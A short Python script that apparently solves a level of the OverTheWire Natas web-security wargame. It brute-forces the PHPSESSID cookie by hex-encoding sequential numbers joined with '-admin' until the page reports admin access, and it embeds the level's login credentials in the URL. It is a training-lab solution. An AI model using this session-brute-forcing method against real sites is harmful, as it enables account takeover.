#Brute forcing admin session ID using the PHPSESSID cookie value
#Encoding the value in hex, alongside the username
import requests;
dest = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/index.php';

max = 640;

for i in range (0, 640) :
	id = i + 1;
	print 'Attempt: %s' % id;
	sID = (str(id) + '-admin').encode('hex');
	c = {'PHPSESSID' : sID};
	r = requests.get(dest,cookies=c);
	if (r.content.find('You are an admin.') > -1) :
		print 'Admin session ID is %s\nReturned content reads:\n' % id;
		print r.content;
		break;
